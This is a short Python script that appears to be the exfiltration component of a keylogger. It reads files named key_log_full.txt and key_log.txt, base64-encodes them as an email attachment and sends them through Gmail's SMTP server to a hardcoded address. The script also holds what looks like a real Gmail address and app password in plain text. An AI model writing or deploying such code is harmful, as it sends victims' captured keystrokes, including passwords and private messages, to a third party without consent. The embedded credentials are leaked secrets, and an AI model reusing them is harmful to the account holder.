from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from  email.mime.base import MIMEBase
from email import encoders
import smtplib

key_information_full="key_log_full.txt"
key_information="key_log.txt"

sender_email = "saivishwas737146@gmail.com"
app_password = "ptfe wfst ldtj oyvy"
receiver_email = "saivishwas737146@gmail.com"
subject = "Test Email with Attachment"
body = "This is a test email with an attachment."
attachment_path = key_information

def send_email(sender_email, app_password, receiver_email, subject, body, attachment_path):
    # Create the MIME object
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Attach the body of the email
    msg.attach(MIMEText(body, 'plain'))

    # Attach the file
    with open(attachment_path, 'rb') as attachment:
        attachment_part = MIMEBase('application', 'octet-stream')
        attachment_part.set_payload(attachment.read())
        encoders.encode_base64(attachment_part)
        attachment_part.add_header('Content-Disposition', f"attachment; filename= {attachment_path}")
        msg.attach(attachment_part)

    try:
        # Connect to Gmail's SMTP server
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()

            # Login to your Gmail account using the App Password
            server.login(sender_email, app_password)

            # Send the email
            server.sendmail(sender_email, receiver_email, msg.as_string())

        print("Email sent successfully! --> "+attachment_path)

    except Exception as e:
        print(f"Error: {e}")

send_email(sender_email, app_password, receiver_email, subject, body, key_information_full)
